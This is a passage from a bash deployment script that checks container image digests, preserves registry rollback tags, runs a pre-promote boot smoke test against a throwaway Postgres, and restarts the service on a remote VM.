      "cd ${remote_dir_q} && cid=\$(docker compose ${compose_files} ps -q api 2>/dev/null | head -1) && [ -n \"\$cid\" ] && docker inspect --format '{{.Image}}' \"\$cid\"")" || rc=$?
  if (( rc != 0 )) || [[ ! "${image_id}" =~ ^sha256:[a-f0-9]{64}$ ]]; then
    warn "Could not resolve the running api image ID for ${env} (got: ${image_id:-empty})"
    return 1
  fi
  printf '%s\n' "${image_id}"
}

# Return validated runtime-generation evidence for the compose-scoped api
# service. Each non-empty record is:
#   RUNTIME|container-id|image-id|state|compose-project|compose-service|config-hash
# `ps -q` is authoritative for a live container; when it is empty, `ps -a -q`
# is inspected so a stopped replacement can prove that this transaction reached
# the candidate generation. ABSENT is a successful observation of no container,
# not ownership evidence. Any transport, inspect, parse, or label failure is
# unknown and returns non-zero so callers cannot compensate blindly.
read_api_runtime_evidence() {
  local env="$1" remote_dir compose_files remote_dir_q timeout output rc=0
  local record kind container_id image_id state compose_project compose_service config_hash extra
  local normalized=""
  remote_dir="$(env_to_remote_dir "${env}")"
  compose_files="$(env_to_compose_files "${env}")"
  remote_dir_q="$(remote_quote "${remote_dir}")"
  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
  # shellcheck disable=SC2086 # compose_files is intentionally word-split remotely.
  output="$(run_with_deadline "${timeout}" "api runtime-generation inspection for ${env}" \
    ssh -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
      -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
      -l "${OCI_USER}" -- "${OCI_HOST}" \
      "cd ${remote_dir_q} && \
       running_ids=\$(docker compose ${compose_files} ps -q api 2>/dev/null) || exit 41; \
       running_cid=\$(printf '%s\\n' \"\$running_ids\" | sed -n '1p'); \
       if [ -n \"\$running_cid\" ]; then \
         docker inspect --format 'RUNTIME|{{.Id}}|{{.Image}}|{{.State.Status}}|{{index .Config.Labels \"com.docker.compose.project\"}}|{{index .Config.Labels \"com.docker.compose.service\"}}|{{index .Config.Labels \"com.docker.compose.config-hash\"}}' \"\$running_cid\" || exit 42; \
       else \
         stopped_ids=\$(docker compose ${compose_files} ps -a -q api 2>/dev/null) || exit 43; \
         if [ -z \"\$stopped_ids\" ]; then \
           printf '%s\\n' ABSENT; \
         else \
           for stopped_cid in \$stopped_ids; do \
             docker inspect --format 'RUNTIME|{{.Id}}|{{.Image}}|{{.State.Status}}|{{index .Config.Labels \"com.docker.compose.project\"}}|{{index .Config.Labels \"com.docker.compose.service\"}}|{{index .Config.Labels \"com.docker.compose.config-hash\"}}' \"\$stopped_cid\" || exit 44; \
           done; \
         fi; \
       fi")" || rc=$?
  if (( rc != 0 )); then
    return "${rc}"
  fi
  if [[ "${output}" == "ABSENT" ]]; then
    printf '%s\n' "ABSENT"
    return 0
  fi
  [[ -n "${output}" ]] || return 1
  while IFS='|' read -r record container_id image_id state compose_project compose_service config_hash extra; do
    [[ "${record}" == "RUNTIME" && -z "${extra}" ]] || return 1
    [[ "${container_id}" =~ ^[a-f0-9]{12,64}$ ]] || return 1
    [[ "${image_id}" =~ ^sha256:[a-f0-9]{64}$ ]] || return 1
    [[ "${state}" =~ ^(running|restarting|created|exited|dead)$ ]] || return 1
    [[ "${compose_project}" =~ ^[A-Za-z0-9_.-]+$ ]] || return 1
    [[ "${compose_service}" == "api" ]] || return 1
    [[ "${config_hash}" =~ ^[A-Za-z0-9_.:-]+$ ]] || return 1
    case "${state}" in
      running|restarting) kind="RUNNING" ;;
      created|exited|dead) kind="STOPPED" ;;
    esac
    normalized+="${kind}|${container_id}|${image_id}|${state}|${compose_project}|${compose_service}|${config_hash}"$'\n'
  done <<< "${output}"
  [[ -n "${normalized}" ]] || return 1
  printf '%s' "${normalized}"
}

# Capture the image actually serving on the target by immutable image ID before
# a build can overwrite any host-local tag, then publish rollback-<digest-prefix>
# in that image's repository. Prod fails closed when preservation fails; lower
# environments emit a loud warning.
preserve_rollback_tag() {
  local env="$1" running_image_id running_image_ref running_base inspect_output prev_digest prev_base prev_id rollback_ref resolved_id timeout rc=0
  local inspect_timeout
  timeout="${ACX_PUSH_TIMEOUT:-900}"
  inspect_timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
    fail "ACX_PUSH_TIMEOUT must be a positive integer (got: ${timeout})"
  fi
  if ! running_image_id="$(read_running_api_image_id "${env}")"; then
    if [[ "${env}" == "prod" ]]; then
      fail "Cannot identify the image actually serving prod; refusing deployment before build/restart"
    fi
    warn "ROLLBACK NOT PRESERVED: no running api image found (first ${env} deploy?)"
    return 0
  fi
  if ! running_image_ref="$(read_running_api_image "${env}")" \
    || [[ ! "${running_image_ref}" =~ ^[A-Za-z0-9_.:/@-]+$ ]]; then
    if [[ "${env}" == "prod" ]]; then
      fail "Cannot identify the repository configured by the running prod container"
    fi
    warn "ROLLBACK NOT PRESERVED: running image reference is unavailable or malformed"
    return 0
  fi
  if [[ "${running_image_ref}" == *@sha256:* ]]; then
    running_base="${running_image_ref%@sha256:*}"
  elif [[ "${running_image_ref##*/}" == *:* ]]; then
    running_base="${running_image_ref%:*}"
  else
    running_base="${running_image_ref}"
  fi
  assert_safe_image_repo "running image repository" "${running_base}"
  inspect_output="$(run_with_deadline "${inspect_timeout}" "rollback provenance inspection for ${env}" \
    remote_docker_with_config image inspect --format '{{range .RepoDigests}}{{println .}}{{end}}' \
      "${running_image_id}")" || rc=$?
  prev_digest="$(printf '%s\n' "${inspect_output}" | awk -v repo="${running_base}@sha256:" 'index($0, repo) == 1 { print; exit }')"
  if (( rc != 0 )) || [[ ! "${prev_digest}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
    if [[ "${env}" == "prod" ]]; then
      fail "Cannot resolve the running prod image to a registry digest; rollback preservation is mandatory"
    fi
    warn "ROLLBACK NOT PRESERVED: running image ${running_image_id} has no verified registry digest"
    return 0
  fi
  prev_base="${prev_digest%@sha256:*}"
  assert_safe_image_repo "rollback image repository" "${prev_base}"
  prev_id="${prev_digest##*:}"
  prev_id="${prev_id:0:12}"
  rollback_ref="${prev_base}:rollback-${prev_id}"
  if ! run_with_deadline "${inspect_timeout}" "rollback preservation retag for ${env}" \
    remote_docker_with_config tag "${running_image_id}" "${rollback_ref}"; then
    if [[ "${env}" == "prod" ]]; then
      fail "Could not tag the running prod image for rollback"
    fi
    warn "ROLLBACK NOT PRESERVED: could not tag ${running_image_id} as ${rollback_ref}"
    return 0
  fi
  if ! run_with_deadline "${timeout}" "push of ${rollback_ref}" remote_docker_with_config push "${rollback_ref}"; then
    if [[ "${env}" == "prod" ]]; then
      fail "Could not publish mandatory prod rollback tag ${rollback_ref}"
    fi
    warn "ROLLBACK NOT PRESERVED: could not publish ${rollback_ref}"
    return 0
  fi
  # A successful push is not enough for a recovery artifact: pull the registry
  # tag back and prove it resolves to the exact image ID serving this target.
  if ! _pull_ref_remote "${rollback_ref}" >/dev/null \
    || ! resolved_id="$(remote_image_id_for_digest "${prev_digest}")" \
    || [[ "${resolved_id}" != "${running_image_id}" ]]; then
    if [[ "${env}" == "prod" ]]; then
      fail "Published rollback tag ${rollback_ref} did not resolve to the running prod image"
    fi
    warn "ROLLBACK NOT PRESERVED: ${rollback_ref} did not resolve to ${running_image_id}"
    return 0
  fi
  ACX_ROLLBACK_DIGEST_REF="${prev_digest}"
  ACX_ROLLBACK_IMAGE_BASE="${prev_base}"
  ACX_ROLLBACK_TAG="rollback-${prev_id}"
  log "Preserved registry rollback ${rollback_ref} -> ${prev_digest}"
}

#---------------------------------------------------------------- boot smoke
# Pre-promote boot smoke: boot the freshly-built :SHA in a throwaway container on
# the VM *before* :latest is promoted/restarted, so a bad image (missing package,
# import error, failed real boot chain) aborts the deploy with prod still serving
# the old image. Returns non-zero on any smoke failure.
# Two gates: (1) network-free import smoke; (2) full image CMD (docker-entrypoint.sh)
# with the same /data/cache + RECOGNITION_BLOB_ROOT mounts the deployed stack uses,
# so smoke observes entrypoint + /app/.image-variant + VLM cache gates (D4).
do_boot_smoke() {
  local env="$1" image="$2" remote_dir smoke_timeout poll_interval smoke_rc=0
  local pg_ready_budget setup_slack composite_deadline
  local net_create_cap port_cap trap_docker_s smoke_margin
  local kill_grace trap_op_s trap_op_count trap_wall setup_kill_grace
  remote_dir="$(env_to_remote_dir "$env")"
  if [[ ! "${image}" =~ ^${IMAGE_BASE}@sha256:[a-f0-9]{64}$ ]]; then
    warn "boot smoke refused non-digest candidate: ${image}"
    return 1
  fi
  # Image-aware health budget: recognition default 24s; VLM uses the unmeasured
  # longer default. ACX_SMOKE_TIMEOUT overrides either, validated as a positive
  # integer. Postgres ready-wait is a separate budget (SMOKE_PG_READY_TIMEOUT).
  # Inner caps live here once; wrapper deadline and the remote body share them
  # as positionals so the outer run_with_deadline cannot fire first (H2E-01).
  smoke_timeout="$(resolve_smoke_timeout)"
  poll_interval=2
  pg_ready_budget="${SMOKE_PG_READY_TIMEOUT}"
  setup_slack="${SMOKE_SETUP_SLACK}"
  net_create_cap=10
  port_cap=5
  trap_docker_s=10
  smoke_margin=5
  # GR-262: timeout -k 1 makes a hung docker child last secs+1. Failure EXIT
  # trap runs 6 sequential _smoke_timeout 2 ops (logs, rm api, rm pg, volume,
  # inspect, network rm). Four setup caps have the same kill-grace.
  kill_grace=1
  trap_op_s=2
  trap_op_count=6
  trap_wall=$((trap_op_count * (trap_op_s + kill_grace)))
  setup_kill_grace=$((4 * kill_grace))
  composite_deadline=$((net_create_cap + setup_slack + pg_ready_budget + setup_slack + port_cap + smoke_timeout + trap_wall + poll_interval + smoke_margin + setup_kill_grace))
  log "Pre-promote boot smoke: ${image} on ${SSH_TARGET} (env=${env}, health_budget=${smoke_timeout}s, pg_ready_budget=${pg_ready_budget}s, real entrypoint)"
  # A local build authenticated the workstation for its push, not the VM. The
  # smoke pull is a separate remote process and needs the remote half of this
  # deploy's credential config before it can materialise the candidate.
  preflight_remote_ocir_auth
  # S2-A-09: VLM/local-build path still pulls layers onto the VM here — consult
  # free-space floor before docker pull (same OPS-1 guard as remote build).
  assert_remote_disk_headroom_for_pull
  # Gate 1 — network-free import smoke. Catches the ModuleNotFoundError-class
  # packaging omissions (the scene/ incident) without touching the DB.
  # RECOGNITION_RUNTIME_MODE=development so the production load-time secret
  # fail-fast (validate_required_secrets / validate_oci_vault_boot) no-ops — this
  # gate proves the image IMPORTS, not that prod secrets are configured (that is
  # Gate 2, which uses the deployed .env + real entrypoint).
  if ! _pull_ref_remote "${image}" >/dev/null \
    || [[ "$(remote_image_digest_ref "${image}" || true)" != "${image}" ]] \
    || ! run_with_deadline "${smoke_timeout}" "boot-smoke import gate for ${image}" \
      ssh -n -o BatchMode=yes -l "${OCI_USER}" -- "${OCI_HOST}" \
        "docker run --rm -e RECOGNITION_RUNTIME_MODE=development --entrypoint python ${image} -c 'import api.main'"; then
    warn "boot smoke: 'import api.main' failed on ${image} (packaging/import error)"
    return 1
  fi
  # Gate 2 — real image CMD (scripts/docker-entrypoint.sh): migrate + schema verify
  # + optional VLM cache verify + uvicorn. Mounts match docker-compose.env.yml:
  #   ACX_MODELS_PATH → /data/cache:ro
  #   RECOGNITION_BLOB_ROOT=/var/lib/acx-blobs (ephemeral volume for smoke)
  # Network name is read (not sourced) from the deployed .env.
  # DB target is an ephemeral Postgres started for this smoke only — never the
  # env-file / Vault prod DSN (H2 / INT-01). Real entrypoint stays (D4).
  # Health budget is ACX_SMOKE_TIMEOUT; Postgres ready-wait is added to the
  # outer wall-clock so pg_isready cannot steal the /health deadline.
  local vlm_budget=0
  if is_vlm_smoke_budget && [[ -z "${ACX_SMOKE_TIMEOUT:-}" ]]; then
    vlm_budget=1
  fi
  # Pull pgvector outside the smoke body so image fetch cannot consume pg/health budgets.
  if ! run_with_deadline "$(validated_deadline ACX_PULL_TIMEOUT 900)" "boot-smoke pgvector pull for ${image}" \
    ssh -n -o BatchMode=yes -l "${OCI_USER}" -- "${OCI_HOST}" \
      "docker pull pgvector/pgvector:pg17"; then
    warn "boot smoke: pre-pull of pgvector/pgvector:pg17 failed on ${SSH_TARGET}"
    return 1
  fi
  run_with_deadline "${composite_deadline}" "boot-smoke health gate for ${image}" \
    ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
      "bash -s ${env} ${image} ${remote_dir} ${smoke_timeout} ${poll_interval} ${vlm_budget} ${pg_ready_budget} ${setup_slack} ${net_create_cap} ${port_cap} ${trap_docker_s}" <<SMOKE_WRAP || smoke_rc=$?
$(declare -f sanitize_deploy_diagnostic)
$(cat <<'SMOKE'
set -euo pipefail
# Leading space keeps this helper off the column-0 `fn() {` parser.
 _smoke_timeout() {
  local secs="$1" pid watcher rc=0
  shift
  if command -v timeout >/dev/null 2>&1; then
    timeout -k 1 "$secs" "$@"
    return
  fi
  # Cleanup trap ignores TERM/INT/HUP (inherited by children). SIGKILL cannot
  # be ignored, so the no-timeout reaper always bounds the command.
  "$@" &
  pid=$!
  ( sleep "$secs"; kill -s KILL "$pid" 2>/dev/null || true ) &
  watcher=$!
  wait "$pid" || rc=$?
  kill -s KILL "$watcher" 2>/dev/null || true
  wait "$watcher" 2>/dev/null || true
  if (( rc == 143 || rc == 137 )); then
    return 124
  fi
  return "$rc"
}
 _fail_if_setup_timeout() {
  local rc=0
  "$@" || rc=$?
  if (( rc == 124 )); then
    echo "smoke setup timed out" >&2
    exit 1
  fi
  if (( rc != 0 )); then
    exit "$rc"
  fi
}
env="$1"; image="$2"; remote_dir="$3"; budget_s="$4"; poll_s="$5"; vlm_budget="$6"
pg_budget="${7:-30}"
setup_slack="${8:-30}"
net_create_cap="${9:-10}"
port_cap="${10:-5}"
trap_docker_s="${11:-10}"
if ! [[ "${vlm_budget}" =~ ^[01]$ ]]; then
  echo "smoke vlm_budget invalid" >&2
  exit 2
fi
for _smoke_pair in "budget_s=${budget_s}" "poll_s=${poll_s}" "pg_budget=${pg_budget}" "setup_slack=${setup_slack}"; do
  _smoke_var="${_smoke_pair%%=*}"
  _smoke_val="${_smoke_pair#*=}"
  if ! [[ "${_smoke_val}" =~ ^[1-9][0-9]*$ ]]; then
    echo "smoke ${_smoke_var} invalid" >&2
    exit 2
  fi
done
env_file="${remote_dir}/.env"
net="$(grep -E '^ACX_NETWORK_NAME=' "${env_file}" 2>/dev/null | tail -1 | cut -d= -f2- | tr -d "\"' " || true)"
net="${net:-acx-${env}-net}"
models_path="$(grep -E '^ACX_MODELS_PATH=' "${env_file}" 2>/dev/null | tail -1 | cut -d= -f2- | tr -d "\"'" || true)"
name="acx-smoke-${env}-$$"
blob_vol="acx-smoke-blobs-${env}-$$"
pg_name="acx-smoke-pg-${env}-$$"
smoke_owner="${pg_name}"
smoke_user="acx_smoke"
smoke_pass="acx_smoke_not_prod"
smoke_db="acx_smoke"
# Throwaway DSNs — host is the ephemeral container name on the smoke network.
smoke_async_dsn="postgresql+asyncpg://${smoke_user}:${smoke_pass}@${pg_name}:5432/${smoke_db}"
smoke_sync_dsn="postgresql+psycopg://${smoke_user}:${smoke_pass}@${pg_name}:5432/${smoke_db}"
# Inline trap (no nested function) so structural parsers that stop at first \n}\n
# still capture the full do_boot_smoke body. Print last_health_body + docker logs
# here so a deadline SIGTERM still emits the 503 body before cleanup.
# Install the trap before network create so a hung create still cleans up.
curl_err="$(mktemp)"
log_cap="$(mktemp)"
last_health_code="000"
last_health_body=""
smoke_passed=0
# WHY: EPIPE/closed stderr under set -e aborts a trap at the first echo; docker
# ops must run before any diagnostic write, and every write must tolerate failure.
trap '
  set +e
  trap - EXIT
  trap "" TERM INT HUP
  if [[ "${smoke_passed:-0}" != "1" ]]; then
    _smoke_timeout 2 docker logs --tail 80 "$name" >"$log_cap" 2>&1 || true
  fi
  _smoke_timeout 2 docker rm -f "$name" >/dev/null 2>&1 || true
  _smoke_timeout 2 docker rm -f "$pg_name" >/dev/null 2>&1 || true
  _smoke_timeout 2 docker volume rm -f "$blob_vol" >/dev/null 2>&1 || true
  if [[ "${smoke_passed:-0}" != "1" ]]; then
    _smoke_net_owner="$(_smoke_timeout 2 docker network inspect --format "{{index .Labels \"acx.smoke.owner\"}}" "$net" 2>/dev/null || true)"
    if [[ -n "${_smoke_net_owner}" && "${_smoke_net_owner}" == "${smoke_owner}" ]]; then
      _smoke_timeout 2 docker network rm "$net" >/dev/null 2>&1 || true
    fi
    if [[ -n "${curl_err:-}" && -s "${curl_err}" ]]; then
      if ! sanitize_deploy_diagnostic < "${curl_err}" >&2; then
        echo "diagnostic: curl stderr unavailable" >&2 || true
      fi
    fi
    echo "smoke health LAST HTTP code: ${last_health_code:-000}" >&2 || true
    echo "smoke health LAST body (up to 2000 bytes):" >&2 || true
    if ! printf "%s\n" "${last_health_body:0:2000}" | sanitize_deploy_diagnostic >&2; then
      echo "diagnostic: smoke health LAST body unavailable" >&2 || true
    fi
    echo "smoke container logs (last 80 lines):" >&2 || true
    if [[ -s "${log_cap}" ]]; then
      if ! sanitize_deploy_diagnostic < "${log_cap}" >&2; then
        echo "smoke container logs unavailable" >&2 || true
      fi
    else
      echo "smoke container logs unavailable" >&2 || true
    fi
  fi
  rm -f "$curl_err" "$log_cap"
' EXIT
trap 'exit 143' TERM
trap 'exit 130' INT
# First-ever deploy of an env runs this smoke BEFORE converge_runtime's net
# auto-create, so the env net may not exist yet (gate r0811864a A-01). Create
# it idempotently with compose-parity labels so the later `compose up` adopts
# it instead of refusing an unlabeled pre-existing net (A-02 pattern).
# Ownership label lets the trap rm a net whose create timed out after the
# daemon already created it, without touching a compose-owned or foreign net.
if ! docker network inspect "$net" >/dev/null 2>&1; then
  _fail_if_setup_timeout _smoke_timeout "$net_create_cap" docker network create \
    --label com.docker.compose.network=backend \
    --label "com.docker.compose.project=acx-${env}" \
    --label "acx.smoke.owner=${smoke_owner}" \
    "$net"
fi
# Ephemeral Postgres so entrypoint migrate/schema-verify never touch live env DB.
# Ready-wait uses pg_budget, not the /health attempt count / ACX_SMOKE_TIMEOUT.
# --pull=never: pgvector was pre-pulled fail-closed before this body ran.
_fail_if_setup_timeout _smoke_timeout "$setup_slack" docker run -d --rm --name "$pg_name" --network "$net" --pull=never \
  -e POSTGRES_USER="$smoke_user" \
  -e POSTGRES_PASSWORD="$smoke_pass" \
  -e POSTGRES_DB="$smoke_db" \
  pgvector/pgvector:pg17 >/dev/null
pg_ready=0
pg_end=$((SECONDS + pg_budget))
while (( SECONDS < pg_end )); do
  pg_exec_rc=0
  _smoke_timeout 2 docker exec "$pg_name" pg_isready -U "$smoke_user" -d "$smoke_db" >/dev/null 2>&1 || pg_exec_rc=$?
  if (( pg_exec_rc == 0 )); then
    pg_ready=1
    break
  fi
  if (( SECONDS < pg_end )); then
    sleep 1
  fi
done
if [[ "$pg_ready" != "1" ]]; then
  echo "smoke ephemeral postgres failed to become ready" >&2
  exit 1
fi
# Real image CMD — do not override entrypoint; must exercise docker-entrypoint.sh
# (and /app/.image-variant fail-closed checks owned by sibling lane).
# -e overrides beat --env-file; force env secret backend so oci_vault cannot
# inject the live prod POSTGRES_DSN after env-file is loaded.
# tmpfs matches compose HF_MODULES_CACHE mount (HARM-A-02): noexec + uid 10001
# so smoke exercises the deployed module-scratch topology, not the image layer dir.
# S2-A-08: compose hard-fails without ACX_MODELS_PATH (no default on the :ro
# cache bind). Smoke must not go green on an .env the real stack cannot start under.
if [[ -z "${models_path}" ]]; then
  echo "smoke requires ACX_MODELS_PATH in ${env_file} (compose would fail without it)" >&2
  exit 1
fi
# WHY: do not --rm the API smoke container. Entrypoint crash would delete it
# before the failure branch can `docker logs`; the EXIT trap already rm -f's it.
run_args=( -d --name "$name" --env-file "${env_file}" --network "$net" -P
  -e RECOGNITION_BLOB_ROOT=/var/lib/acx-blobs
  -e RECOGNITION_SECRET_BACKEND=env
  -e POSTGRES_DSN="${smoke_async_dsn}"
  -e POSTGRES_SYNC_DSN="${smoke_sync_dsn}"
  -e PGHOST="${pg_name}"
  -e PGPORT=5432
  -e PGUSER="${smoke_user}"
  -e PGPASSWORD="${smoke_pass}"
  -e DB_NAME="${smoke_db}"
  -e RECOGNITION_ADMIN_TOKEN=acx-smoke-admin-token-not-for-prod-use
  -v "${blob_vol}:/var/lib/acx-blobs"
  -v "${models_path}:/data/cache:ro"
  --tmpfs /var/cache/acx/hf_modules:mode=0700,uid=10001,gid=10001,size=32m,noexec )
_fail_if_setup_timeout _smoke_timeout "$setup_slack" docker run "${run_args[@]}" "$image" >/dev/null
port_rc=0
port_out="$(_smoke_timeout "$port_cap" docker port "$name" 8000/tcp)" || port_rc=$?
if (( port_rc == 124 )); then
  echo "smoke setup timed out" >&2
  exit 1
fi
if (( port_rc != 0 )); then
  exit "$port_rc"
fi
port="$(printf '%s\n' "$port_out" | head -1 | sed 's/.*://')"
if ! [[ "${port}" =~ ^[0-9]+$ ]]; then
  echo "smoke setup failed: no published port" >&2
  exit 1
fi
# EXIT trap: timeout 2 × 6 docker ops; trap_docker_s reserves health-loop tail.
# Outer composite adds +1s kill-grace per op (GR-262).
diag_reserve=$((trap_docker_s + poll_s))
health_budget=$((budget_s - diag_reserve))
if (( health_budget < 1 )); then
  health_budget=1
fi
health_end=$((SECONDS + health_budget))
probe_n=0
while (( SECONDS < health_end )); do
  # Skip a curl that would eat the diag reserve, but always allow the first
  # probe so a tiny clamped health_budget still observes /health.
  if (( probe_n > 0 && health_end - SECONDS <= poll_s )); then
    break
  fi
  health_response=""
  health_curl_rc=0
  health_response="$(curl -sS --max-time $(( health_end - SECONDS > 0 ? health_end - SECONDS : 1 )) --write-out $'\n%{http_code}' "http://127.0.0.1:${port}/health" 2>"${curl_err}")" || health_curl_rc=$?
  probe_n=$((probe_n + 1))
  if [[ "${health_response}" == *$'\n'* ]]; then
    last_health_code="${health_response##*$'\n'}"
    last_health_body="${health_response%$'\n'*}"
  else
    last_health_code="000"
    last_health_body="${health_response}"
  fi
  [[ "${last_health_code}" =~ ^[0-9]{3}$ ]] || last_health_code="000"
  if (( health_curl_rc == 0 )) && [[ "${last_health_code}" =~ ^2[0-9][0-9]$ ]]; then
    # Exit before any /ready probe. The outer run_with_deadline uses the same
    # budget as this loop; a diagnostic must not turn a marginal pass into rc 124.
    if ! printf '%s\n' "smoke health OK (HTTP ${last_health_code})" | sanitize_deploy_diagnostic; then
      echo "diagnostic: smoke health OK (HTTP ${last_health_code})"
    fi
    smoke_passed=1
    exit 0
  fi
  if (( SECONDS < health_end )); then
    sleep "${poll_s}"
  fi
done
if [[ "${vlm_budget}" == "1" ]]; then
  echo "smoke health FAILED after ${budget_s}s (VLM budget is an UNVALIDATED default — raise via ACX_SMOKE_TIMEOUT once a real arm64 VLM smoke is measured)" >&2
else
  echo "smoke health FAILED after ${budget_s}s" >&2
fi
exit 1
SMOKE
)
SMOKE_WRAP
  if (( smoke_rc != 0 )); then
    if (( smoke_rc == 124 )); then
      warn "boot smoke: phase unknown for ${image} after composite deadline ${composite_deadline}s"
    elif [[ "${vlm_budget}" == "1" ]]; then
      warn "boot smoke: /health never came up for ${image} after ${smoke_timeout}s (VLM budget is an UNVALIDATED default — set ACX_SMOKE_TIMEOUT=<seconds> to raise it)"
    else
      warn "boot smoke: /health never came up for ${image} after ${smoke_timeout}s"
    fi
    return 1
  fi
  log "Boot smoke passed for ${image}"
}

# One-shot acx_blobs ownership repair for volumes created under root before USER acx
# (ORCH-LAUNCH-01-REV-r0811af90-S1-A-02). Docker only propagates image-path ownership
# when initialising an empty new volume — existing root:root named volumes stay root
# forever and every multipart upload 500s with EACCES. Compose defines a
# profiles:[repair] fix-blob-ownership service.
# W8-VER-03: probe volume-root ownership first; skip the O(blobs) recursive chown
# when the root is already acx-owned (migration is one-shot after the first repair).
repair_blob_volume_ownership() {
  local env="$1"
  local remote_dir compose_files timeout
  remote_dir="$(env_to_remote_dir "$env")"
  compose_files="$(env_to_compose_files "$env")"
  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
  log "Repairing acx_blobs ownership on ${env} (probe-then-chown; fix-blob-ownership profile)"
  # shellcheck disable=SC2086 # compose_files is intentionally word-split (-f a -f b).
  # Probe runs as root via the repair profile image; uid 10001 is the Dockerfile acx user.
  if ! run_with_deadline "${timeout}" "blob ownership repair for ${env}" \
    ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
    "cd '${remote_dir}' && docker compose ${compose_files} --profile repair run --rm --entrypoint sh fix-blob-ownership -c '
      root=/var/lib/acx-blobs
      uid=\$(stat -c %u \"\$root\" 2>/dev/null || echo unknown)
      if [ \"\$uid\" = \"10001\" ]; then
        echo \"acx_blobs root already uid=10001; skip recursive chown\"
        exit 0
      fi
      echo \"acx_blobs root uid=\$uid; running recursive chown acx:acx\"
      chown -R acx:acx \"\$root\"
    '"; then
    warn "acx_blobs ownership repair failed on ${env}; multipart uploads will EACCES under USER acx. Run: cd ${remote_dir} && docker compose ${compose_files} --profile repair run --rm fix-blob-ownership"
    return 1
  fi
}

verify_running_image_digest() {
  local env="$1" expected_digest="$2" running_image_id expected_image_id
  running_image_id="$(read_running_api_image_id "${env}" || true)"
  expected_image_id="$(remote_image_id_for_digest "${expected_digest}" || true)"
  if [[ -z "${running_image_id}" || "${running_image_id}" != "${expected_image_id}" ]]; then
    warn "IMMUTABLE IMAGE MISMATCH: ${env} serves ${running_image_id:-unknown}, expected ${expected_image_id:-unknown} from ${expected_digest}"
    return 1
  fi
}

verify_restored_runtime() {
  local env="$1" expected_digest="$2" url attempt max_attempts sleep_s body
  url="$(env_to_health_url "${env}")"
  max_attempts="${ACX_VERIFY_ATTEMPTS:-5}"
  sleep_s="${ACX_VERIFY_SLEEP:-5}"
  [[ "${max_attempts}" =~ ^[1-9][0-9]*$ ]] || return 1
  [[ "${sleep_s}" =~ ^[0-9]+$ ]] || return 1
  for attempt in $(seq 1 "${max_attempts}"); do
    if body="$(curl --fail --silent --show-error --max-time 10 "${url}" 2>&1)" \
      && verify_running_image_digest "${env}" "${expected_digest}"; then
      log "Rollback verified healthy: ${env} serves ${expected_digest}"
      return 0
    fi
    warn "Rollback health/digest verification failed on attempt ${attempt}/${max_attempts}"
    if ! printf '%s\n' "${body:-no health response}" | sanitize_deploy_diagnostic >&2; then
      echo "diagnostic: rollback health body unavailable" >&2
    fi
    verify_retry_sleep "${attempt}" "${max_attempts}" "${sleep_s}"
  done
  return 1
}

do_restart() {
  local env="$1" expected_digest="${2:-${ACX_CANDIDATE_DIGEST_REF:-}}"
  local unit expected_repo env_tag pulled_digest timeout
  ACX_RESTART_EVIDENCE_PHASE="pre_candidate"
  unit="$(env_to_unit "$env")"
  expected_repo="${expected_digest%@sha256:*}"
  env_tag="$(env_to_tag "${env}")"
  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
  if [[ ! "${expected_digest}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ \
    || "${expected_repo}" != "${ACX_IMAGE_REPO}" ]]; then
    warn "restart requires the smoke-fenced digest for ACX_IMAGE_REPO=${ACX_IMAGE_REPO} (got: ${expected_digest:-empty})"
    return 1
  fi
  # ACX_IMAGE_REPO is shipped once in promote_gate (S2-A-06), including the
  # ACX_CONVERGE_RUNTIME=0 image-only path — do not rewrite .env again here.
  # A-11: pull materialises layers on the VM — free-space floor for VLM.
  assert_remote_disk_headroom_for_pull
  # Pull first so the repair service image matches the about-to-restart stack.
  # This also covers ACX_BOOT_SMOKE=0, where the earlier remote pull/login was
  # deliberately skipped.
  preflight_remote_ocir_auth
  log "Pulling smoke-fenced ${expected_digest} on ${SSH_TARGET}"
  if ! _pull_ref_remote "${expected_digest}"; then
    warn "digest-pinned api pull failed on ${env}"
    return 1
  fi
  pulled_digest="$(remote_image_digest_ref "${expected_digest}" || true)"
  if [[ "${pulled_digest}" != "${expected_digest}" ]]; then
    warn "DIGEST MISMATCH: restart expected ${expected_digest}, target resolved ${pulled_digest:-empty}"
    return 1
  fi
  # Compose names the mutable environment tag. Point the VM-local tag at the
  # exact bytes that passed smoke; never re-pull that mutable tag across the gate.
  if ! remote_docker_with_config tag "${expected_digest}" "${expected_repo}:${env_tag}"; then
    warn "could not stage ${expected_digest} as the VM-local ${expected_repo}:${env_tag}"
    return 1
  fi
  if ! repair_blob_volume_ownership "$env"; then
    return 1
  fi
  log "Restarting ${unit} on ${SSH_TARGET}"
  ACX_RESTART_EVIDENCE_PHASE="post_restart"
  if ! run_with_deadline "${timeout}" "systemctl restart ${unit}" \
    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "sudo systemctl restart ${unit}"; then
    warn "systemctl restart ${unit} failed"
    return 1
  fi
}

# Restore both the registry env tag and the VM's cached tag to the digest that
# was serving before this transaction. This closes the latent-rollout window
# when digest staging succeeds but a later repair/restart/verify step fails.
restore_env_tag_to_rollback() {
  local env="$1" restart_runtime="${2:-0}" env_tag timeout rollback_base unit pulled_digest
  local inspect_timeout current_digest candidate_digest candidate_base
  local rollback_image_id candidate_image_id runtime_evidence runtime_kind
  local runtime_cid runtime_image_id runtime_state runtime_project runtime_service runtime_hash
  local runtime_owner=""
  if [[ ! "${ACX_ROLLBACK_DIGEST_REF:-}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
    warn "ROLLBACK REQUIRED but no previous serving digest was captured"
    return 1
  fi
  rollback_base="${ACX_ROLLBACK_IMAGE_BASE:-${ACX_ROLLBACK_DIGEST_REF%@sha256:*}}"
  if [[ "${ACX_ROLLBACK_DIGEST_REF}" != "${rollback_base}@sha256:"* ]]; then
    warn "ROLLBACK REQUIRED but the captured repository and digest disagree"
    return 1
  fi
